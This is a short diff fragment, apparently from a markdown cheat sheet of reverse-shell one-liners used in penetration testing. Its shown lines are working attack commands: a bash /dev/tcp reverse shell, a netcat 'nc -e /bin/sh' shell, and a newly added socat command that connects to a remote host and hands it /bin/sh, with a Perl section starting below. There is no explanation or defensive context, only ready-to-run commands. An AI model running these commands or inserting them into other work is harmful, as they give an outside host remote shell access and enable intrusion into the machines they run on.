@@ -34,6 +34,12 @@ bash -i >& /dev/tcp/192.168.0.1/8080 0>&1
 nc -e /bin/sh 192.168.0.5 4444
 ```
 
+#### Socat :
+
+```
+socat tcp-connect:192.168.0.5:4444 system:/bin/sh
+```
+
 #### Perl :
 
 ```
